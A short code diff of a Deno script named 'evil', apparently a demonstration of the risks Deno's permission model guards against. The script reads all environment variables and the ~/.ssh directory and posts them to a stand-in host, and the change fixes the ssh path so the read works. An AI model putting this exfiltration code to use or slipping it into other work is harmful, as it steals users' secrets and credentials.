@@ -1,7 +1,7 @@
 (async function evil() {
   const env = Deno.env.toObject();
   console.log("read your env variables");
-  const sshFiles = await Deno.readDir("~/.ssh");
+  const sshFiles = await Deno.readDir(`${Deno.env.get("HOME")}/.ssh`);
   await fetch("https://some-evil-service", {
     method: "post",
     body: JSON.stringify({ env, sshFiles }),
